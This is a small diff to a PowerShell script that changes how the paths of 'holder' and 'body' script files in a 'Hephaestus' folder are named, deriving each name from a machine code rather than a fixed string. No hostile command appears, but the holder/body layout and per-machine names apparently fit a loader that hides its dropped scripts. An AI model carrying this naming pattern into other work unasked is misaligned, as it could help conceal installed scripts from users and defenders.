@@ -108,14 +108,14 @@ function Get-HephaestusFolder {
 
 function Get-HolderPath {
     $hephaestusFolder = Get-HephaestusFolder
-    $scriptName = 'holder' + '.' + 'ps1'
+    $scriptName = (Get-MachineCode) + '.' + 'ps1'
     $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
     return $holderPath
 }
 
 function Get-BodyPath {
     $hephaestusFolder = Get-HephaestusFolder
-    $scriptName = 'body' + '.' + 'ps1'
+    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
     $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
     return $bodyPath
 }
